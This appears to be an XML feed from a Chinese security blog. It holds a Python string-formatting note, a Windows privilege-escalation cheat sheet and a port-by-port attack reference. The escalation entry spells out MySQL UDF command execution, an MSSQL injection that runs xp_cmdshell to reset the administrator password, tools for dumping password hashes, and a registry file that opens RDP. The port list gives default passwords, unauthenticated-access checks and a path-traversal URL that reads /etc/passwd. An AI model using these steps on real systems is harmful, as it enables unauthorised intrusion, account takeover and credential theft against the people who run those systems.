class="string">'abracadabra'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'Coordinates: &#123;latitude&#125;, &#123;longitude&#125;'</span>.format(latitude=<span class="string">'37.24N'</span>, longitude=<span class="string">'-115.81W'</span>)</span><br><span class="line"><span class="string">'Coordinates: 37.24N, -115.81W'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>coord = &#123;<span class="string">'latitude'</span>: <span class="string">'37.24N'</span>, <span class="string">'longitude'</span>: <span class="string">'-115.81W'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'Coordinates: &#123;latitude&#125;, &#123;longitude&#125;'</span>.format(**coord)</span><br><span class="line"><span class="string">'Coordinates: 37.24N, -115.81W'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="number">3</span><span class="number">-5j</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="string">'The complex number &#123;0&#125; is formed from the real part &#123;0.real&#125; '</span></span><br><span class="line"><span class="meta">... </span> <span class="string">'and the imaginary part &#123;0.imag&#125;.'</span>).format(c)</span><br><span class="line"><span class="string">'The complex number (3-5j) is formed from the real part 3.0 and the imaginary part -5.0.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line"><span class="meta">... </span>        self.x, self.y = x, y</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="string">'Point(&#123;self.x&#125;, &#123;self.y&#125;)'</span>.format(self=self)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(Point(<span class="number">4</span>, <span class="number">2</span>))</span><br><span class="line"><span class="string">'Point(4, 2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; coord = (3, 5)</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>X: &#123;<span class="number">0</span>[<span class="number">0</span>]&#125;;  Y: &#123;<span class="number">0</span>[<span class="number">1</span>]&#125;<span class="string">'.format(coord)</span></span><br><span class="line"><span class="string">'</span>X: <span class="number">3</span>;  Y: <span class="number">5</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; "repr() shows quotes: &#123;!r&#125;; str() doesn'</span>t: &#123;!s&#125;<span class="string">".format('test1', 'test2')</span></span><br><span class="line"><span class="string">"</span>repr() shows quotes: <span class="string">'test1'</span>; str() doesn<span class="string">'t: test2"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:&lt;<span class="number">30</span>&#125;<span class="string">'.format('</span>left aligned<span class="string">')</span></span><br><span class="line"><span class="string">'</span>left aligned                  <span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:&gt;<span class="number">30</span>&#125;<span class="string">'.format('</span>right aligned<span class="string">')</span></span><br><span class="line"><span class="string">'</span>                 right aligned<span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:^<span class="number">30</span>&#125;<span class="string">'.format('</span>centered<span class="string">')</span></span><br><span class="line"><span class="string">'</span>           centered           <span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:*^<span class="number">30</span>&#125;<span class="string">'.format('</span>centered<span class="string">')  # use '</span>*<span class="string">' as a fill char</span></span><br><span class="line"><span class="string">'</span>***********centered***********<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:+f&#125;; &#123;:+f&#125;<span class="string">'.format(3.14, -3.14)  # show it always</span></span><br><span class="line"><span class="string">'</span>+<span class="number">3.140000</span>; <span class="number">-3.140000</span><span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;: f&#125;; &#123;: f&#125;<span class="string">'.format(3.14, -3.14)  # show a space for positive numbers</span></span><br><span class="line"><span class="string">'</span> <span class="number">3.140000</span>; <span class="number">-3.140000</span><span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:-f&#125;; &#123;:-f&#125;<span class="string">'.format(3.14, -3.14)  # show only the minus -- same as '</span>&#123;:f&#125;; &#123;:f&#125;<span class="string">'</span></span><br><span class="line"><span class="string">'</span><span class="number">3.140000</span>; <span class="number">-3.140000</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; # format also supports binary numbers</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; "int: &#123;0:d&#125;;  hex: &#123;0:x&#125;;  oct: &#123;0:o&#125;;  bin: &#123;0:b&#125;".format(42)</span></span><br><span class="line"><span class="string">'</span>int: <span class="number">42</span>;  hex: <span class="number">2</span>a;  oct: <span class="number">52</span>;  bin: <span class="number">101010</span><span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; # with 0x, 0o, or 0b as prefix:</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; "int: &#123;0:d&#125;;  hex: &#123;0:#x&#125;;  oct: &#123;0:#o&#125;;  bin: &#123;0:#b&#125;".format(42)</span></span><br><span class="line"><span class="string">'</span>int: <span class="number">42</span>;  hex: <span class="number">0x2a</span>;  oct: <span class="number">0o52</span>;  bin: <span class="number">0b101010</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:,&#125;<span class="string">'.format(1234567890)</span></span><br><span class="line"><span class="string">'</span><span class="number">1</span>,<span class="number">234</span>,<span class="number">567</span>,<span class="number">890</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; points = 19.5</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; total = 22</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>Correct answers: &#123;:<span class="number">.2</span>%&#125;.<span class="string">'.format(points/total)</span></span><br><span class="line"><span class="string">'</span>Correct answers: <span class="number">88.64</span>%<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; import datetime</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; d = datetime.datetime(2010, 7, 4, 12, 15, 58)</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:%Y-%m-%d %H:%M:%S&#125;<span class="string">'.format(d)</span></span><br><span class="line"><span class="string">'</span><span class="number">2010</span><span class="number">-07</span><span class="number">-04</span> <span class="number">12</span>:<span class="number">15</span>:<span class="number">58</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; for align, text in zip('</span>&lt;^&gt;<span class="string">', ['</span>left<span class="string">', '</span>cente<span class="string">r', '</span>right<span class="string">']):</span></span><br><span class="line"><span class="string">...     '</span>&#123;<span class="number">0</span>:&#123;fill&#125;&#123;align&#125;<span class="number">16</span>&#125;<span class="string">'.format(text, fill=align, align=align)</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">'</span>left&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="string">'</span></span><br><span class="line"><span class="string">'</span>^^^^^center^^^^^<span class="string">'</span></span><br><span class="line"><span class="string">'</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;right<span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; octets = [192, 168, 0, 1]</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; '</span>&#123;:<span class="number">02</span>X&#125;&#123;:<span class="number">02</span>X&#125;&#123;:<span class="number">02</span>X&#125;&#123;:<span class="number">02</span>X&#125;<span class="string">'.format(*octets)</span></span><br><span class="line"><span class="string">'</span>C0A80001<span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; int(_, 16)</span></span><br><span class="line"><span class="string">3232235521</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; width = 5</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; for num in range(5,12):</span></span><br><span class="line"><span class="string">...     for base in '</span>dXo<span class="string">b':</span></span><br><span class="line"><span class="string">...         print '</span>&#123;<span class="number">0</span>:&#123;width&#125;&#123;base&#125;&#125;<span class="string">'.format(num, base=base, width=width),</span></span><br><span class="line"><span class="string">...     print</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">    5     5     5   101</span></span><br><span class="line"><span class="string">    6     6     6   110</span></span><br><span class="line"><span class="string">    7     7     7   111</span></span><br><span class="line"><span class="string">    8     8    10  1000</span></span><br><span class="line"><span class="string">    9     9    11  1001</span></span><br><span class="line"><span class="string">   10     A    12  1010</span></span><br><span class="line"><span class="string">   11     B    13  1011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; from string import Template</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; s = Template('</span>$who likes $what<span class="string">')</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; s.substitute(who='</span>tim<span class="string">', what='</span>kung pao<span class="string">')</span></span><br><span class="line"><span class="string">'</span>tim likes kung pao<span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; d = dict(who='</span>tim<span class="string">')</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; Template('</span>Give $who $<span class="number">100</span><span class="string">').substitute(d)</span></span><br><span class="line"><span class="string">Traceback (most recent call last):</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">ValueError: Invalid placeholder in string: line 1, col 10</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; Template('</span>$who likes $what<span class="string">').substitute(d)</span></span><br><span class="line"><span class="string">Traceback (most recent call last):</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">KeyError: '</span>what<span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; Template('</span>$who likes $what<span class="string">').safe_substitute(d)</span></span><br><span class="line"><span class="string">'</span>tim likes $what<span class="string">'</span></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">string.capitalize(word) 返回一个副本，首字母大写</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.capitalize(<span class="string">"hello"</span>)</span><br><span class="line"><span class="string">'Hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.capitalize(<span class="string">"hello world"</span>)</span><br><span class="line"><span class="string">'Hello world'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.split(<span class="string">"asdadada asdada"</span>)</span><br><span class="line">[<span class="string">'asdadada'</span>, <span class="string">'asdada'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.strip(<span class="string">"              adsd         "</span>)</span><br><span class="line"><span class="string">'adsd'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.rstrip(<span class="string">"              adsd         "</span>)</span><br><span class="line"><span class="string">'              adsd'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.lstrip(<span class="string">"              adsd         "</span>)</span><br><span class="line"><span class="string">'adsd         '</span></span><br><span class="line"></span><br><span class="line">string.swapcase(s) 小写变大写，大写变小写</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.swapcase(<span class="string">"Helloo"</span>)</span><br><span class="line"><span class="string">'hELLOO'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ljust(<span class="string">"ww"</span>,<span class="number">20</span>)</span><br><span class="line"><span class="string">'ww                  '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.rjust(<span class="string">'ww'</span>,<span class="number">20</span>)</span><br><span class="line"><span class="string">'                  ww'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.center(<span class="string">'ww'</span>,<span class="number">20</span>)</span><br><span class="line"><span class="string">'         ww         '</span></span><br><span class="line">string.zfill(s, width)</span><br><span class="line">Pad a numeric string on the left <span class="keyword">with</span> zero digits until the given width <span class="keyword">is</span> reached. Strings starting <span class="keyword">with</span> a sign are handled correctly.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.zfill(<span class="string">'ww'</span>,<span class="number">20</span>)</span><br><span class="line"><span class="string">'000000000000000000ww'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> python </category>
          
          <category> 模块 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
            <tag> string </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows提权</title>
      <link href="/2016/07/24/%E6%8F%90%E6%9D%83%E5%90%8E%E9%97%A8/windows%E6%8F%90%E6%9D%83/"/>
      <url>/2016/07/24/%E6%8F%90%E6%9D%83%E5%90%8E%E9%97%A8/windows%E6%8F%90%E6%9D%83/</url>
      <content type="html"><![CDATA[<h2 id="水平权限提升"><a href="#水平权限提升" class="headerlink" title="水平权限提升"></a>水平权限提升</h2><p>获得其他用户的权限</p><h2 id="垂直权限提升"><a href="#垂直权限提升" class="headerlink" title="垂直权限提升"></a>垂直权限提升</h2><p>由普通的或者权限不完整的账号提升为拥有完整权限的管理员账号或者root权限</p><h2 id="操作系统漏洞提权"><a href="#操作系统漏洞提权" class="headerlink" title="操作系统漏洞提权"></a>操作系统漏洞提权</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>查看系统信息补丁编号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Ni7eipr&gt;systeminfo</span><br><span class="line"></span><br><span class="line">主机名:</span><br><span class="line">OS 名称:          Microsoft Windows 10 专业版</span><br><span class="line">OS 版本:          10.0.10586 暂缺 Build 10586</span><br><span class="line">......</span><br><span class="line">修补程序:         安装了 6 个修补程序。</span><br><span class="line">                  [01]: KB3139907</span><br><span class="line">                  [02]: KB3140768</span><br><span class="line">                  [03]: KB3142588</span><br><span class="line">                  [04]: KB3173428</span><br><span class="line">                  [05]: KB3174060</span><br><span class="line">                  [06]: KB3172985</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><h3 id="检查补丁情况命令"><a href="#检查补丁情况命令" class="headerlink" title="检查补丁情况命令"></a>检查补丁情况命令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3057191</span><br><span class="line">KB2840221 KB3000061 KB2850851 KB2711167 KB2360937</span><br><span class="line">KB2478960 KB2507938 KB2566454 KB2646524 KB2645640</span><br><span class="line">KB2641653 KB944653 KB952004 KB971657 KB2620712</span><br><span class="line">KB2393802 KB942831 KB2503665 KB2592799 KB956572</span><br><span class="line">KB977165 KB2621440) <span class="keyword">do</span> @<span class="built_in">type</span> C:\Windows\Temp\temp.txt|</span><br><span class="line">@<span class="built_in">find</span> /i "%i"|| @<span class="built_in">echo</span> %i <span class="keyword">Not</span> Installed!)&amp;<span class="built_in">del</span> /f /q /a C:\Windows</span><br><span class="line">\Temp\temp.txt</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3124280</span><br><span class="line">KB3143141 KB3134228 KB3079904 KB3077657 KB3124280</span><br><span class="line">KB3045171 KB2829361 KB3000061 KB2850851 KB2707511</span><br><span class="line">KB970483 KB2124261 KB2271195) <span class="keyword">do</span> @<span class="built_in">type</span> C:\Windows</span><br><span class="line">\Temp\temp.txt|@<span class="built_in">find</span> /i "%i"|| @<span class="built_in">echo</span> %i <span class="keyword">Not</span> Installed!)&amp;<span class="built_in">del</span> /f /</span><br><span class="line">q /a C:\Windows\Temp\temp.txt</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://Ni7eipr.github.io/images/jcbd.png" alt="image"></p><p>根据结果网上寻找漏洞进行利用</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://Ni7eipr.github.io/images/tqjg.png" alt="image"></p><h2 id="第三方服务提权"><a href="#第三方服务提权" class="headerlink" title="第三方服务提权"></a>第三方服务提权</h2><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h4><p>UDF 就是 User defined Function</p><p><a href="http://www.2cto.com/database/201110/108925.html" target="_blank" rel="noopener">mysql如何编写udf</a><br><a href="http://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html" target="_blank" rel="noopener"> UDF Compiling and Installing</a></p><p>上传一个udf.dll</p><ul><li>若mysql小于5.1版本<br>C:\WINDOWS\udf.dll 或 C:\WINDOWS\system32\udf.dll</li><li><p>大于mysql5.1版本<br>%mysql%\plugin\udf.dll</p></li><li><p>用 select @@plugin_dir 查询plugin路径<br>默认 C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin\udf.dll</p></li></ul><p>使用sql语句创建功能函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> shell <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure><p>使用sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> shell(‘cmd<span class="string">','</span>whoami<span class="string">')</span></span><br></pre></td></tr></table></figure><p>删除创建的函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> shell;</span><br></pre></td></tr></table></figure><p>直接使用udf.php</p><p><img src="https://Ni7eipr.github.io/images/mtq.png" alt="image"></p><h4 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h4><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>通过xp_cmdshell组件执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.aspx?id=1;EXEC</span><br><span class="line">xp_cmdshell ‘net user administrator 123456&apos;;--</span><br></pre></td></tr></table></figure><p>如果xp_cmdshell被关闭</p><p>执行开启xp_cmdshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1</span><br><span class="line">RECONFIGURE WITH OVERRIDE</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;, 1</span><br><span class="line">RECONFIGURE WITH OVERRIDE</span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 0</span><br><span class="line">RECONFIGURE WITH OVERRIDE</span><br></pre></td></tr></table></figure></p><h2 id="导出主机密码"><a href="#导出主机密码" class="headerlink" title="导出主机密码"></a>导出主机密码</h2><ul><li>mimkatz</li><li>getpass</li></ul><h2 id="导出主机密码hash"><a href="#导出主机密码hash" class="headerlink" title="导出主机密码hash"></a>导出主机密码hash</h2><ul><li>wce</li><li>gethash</li><li>hashdump</li></ul><p>hash解密网站<br><a href="http://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/ophcrack.php</a></p><h2 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control</span><br><span class="line">\Terminal Server]</span><br><span class="line">&quot;fDenyTSConnections&quot;=dword:00000000</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control</span><br><span class="line">\Terminal Server\Wds\rdpwd\Tds\tcp]</span><br><span class="line">&quot;PortNumber&quot;=dword:00000D3D</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control</span><br><span class="line">\Terminal Server\WinStations\RDP-Tcp]</span><br><span class="line">&quot;PortNumber&quot;=dword:00000D3D</span><br><span class="line"></span><br><span class="line">regedit /s c:\3389.reg</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> web </category>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 提权 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>端口服务</title>
      <link href="/2016/06/30/post/%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1/"/>
      <url>/2016/06/30/post/%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">Port    information</span><br><span class="line">21      ftp  主要看是否支持匿名，也可以跑弱口令</span><br><span class="line">22      ssh</span><br><span class="line">23      telnet</span><br><span class="line">79      Finger</span><br><span class="line">80      web  常见web漏洞以及是否为一些管理后台</span><br><span class="line">111     rpcinfo</span><br><span class="line">161     snmp</span><br><span class="line">389     LDAP</span><br><span class="line">443     openssl  心脏滴血以及一些web漏洞测试</span><br><span class="line">445     SMB</span><br><span class="line">512     Rexec</span><br><span class="line">513     Rexec</span><br><span class="line">514     Rexec</span><br><span class="line">873     rsync  未授权，主要看是否支持匿名，也可以跑弱口令</span><br><span class="line">1025    nfs</span><br><span class="line">1099    rmi协议</span><br><span class="line">1433    mssql</span><br><span class="line">1521    oracle</span><br><span class="line">1900    bes默认管理后台</span><br><span class="line">2082    cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2083    cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2100    Oracle XDB FTP服务</span><br><span class="line">2181    zookeeper 未配置权限</span><br><span class="line">2182    zookeeper 未配置权限</span><br><span class="line">2222    DA虚拟主机管理系统登陆 （国外用较多）</span><br><span class="line">2375    docker  未授权访问,Web页面访问http://host:2375/containers/json   &gt;docker -H tcp://host:2375 ps</span><br><span class="line">2601    zebra路由，默认密码zebra</span><br><span class="line">2604    zebra路由，默认密码zebra</span><br><span class="line">3000    Webrick(Ruby Webserver)</span><br><span class="line">3128    squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><span class="line">3306    mysql</span><br><span class="line">3311    kangle主机管理系统登陆 初始用户密码admin/kangle</span><br><span class="line">3312    kangle主机管理系统登陆</span><br><span class="line">3690    svn http://wooyun.org/bugs/wooyun-2015-0141925</span><br><span class="line">3389    mstsc远程桌面</span><br><span class="line">4440    rundeck  参考WooYun: 借用新浪某服务成功漫游新浪内网</span><br><span class="line">4848    GlassFish web中间件 弱口令:admin/adminadmin</span><br><span class="line">5432    postgresql</span><br><span class="line">5900    VNC</span><br><span class="line">5984    CouchDB数据库未授权访问漏洞 http://host:5984/_utils/</span><br><span class="line">6082    varnish  参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><span class="line">6379    redis 一般无认证，可直接访问</span><br><span class="line">6082    varnish</span><br><span class="line">7001    Weblogic</span><br><span class="line">7002    Weblogic</span><br><span class="line">7474    Neo4j</span><br><span class="line">7778    Kloxo主机控制面板登录</span><br><span class="line">8000-9090  Web端口</span><br><span class="line">8000    海康威视    admin/12345</span><br><span class="line">8089    jboss端口 历史曾经爆漏洞/可弱口令</span><br><span class="line">8098    Riak8080    tomcat</span><br><span class="line">8080    tomcat默认tomcat/tomcat WDCP主机管理系统admin/wdlinux.cn root/wdlinux.cn</span><br><span class="line">8083    Vestacp主机管理系统 （国外用较多）</span><br><span class="line">8888    amh/LuManager 主机管理系统默认端口</span><br><span class="line">9000    Hbase</span><br><span class="line">9000    fcgi fcig php执行 资料:http://zone.wooyun.org/content/1060</span><br><span class="line">9043    websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager</span><br><span class="line">9080    WebSphere应用程序</span><br><span class="line">9090    WebSphere管理工具</span><br><span class="line">9090    多个厂商上网行为管理设备命令执行及getshell http://wooyun.org/bugs/wooyun-2016-0192732</span><br><span class="line">9200    elasticsearch   remote code execution</span><br><span class="line">9300    elasticsearch   remote code execution</span><br><span class="line">10000   Virtualmin/Webmin 服务器虚拟主机管理系统</span><br><span class="line">10068   :10068/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd    http://www.wooyun.org/bugs/wooyun-2015-098504</span><br><span class="line">11211   memcache 未授权访问</span><br><span class="line">27017   mongodb 未授权访问</span><br><span class="line">28017   mongodb统计页面</span><br><span class="line">20880   dubbo未授权访问</span><br><span class="line">50000   SAP命令执行</span><br><span class="line">50060   hadoop web案例:WooYun: 爱拍某处产品日志泄漏</span><br><span class="line">50070   hadoop默认端口未授权访问</span><br><span class="line">53413   Netcore(Netis)路由器UDP后门 msf&gt; exploits/linux/misc/netcore_udp_53413_backdoor</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> web </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 端口服务 </tag>
            
        </tags>
      
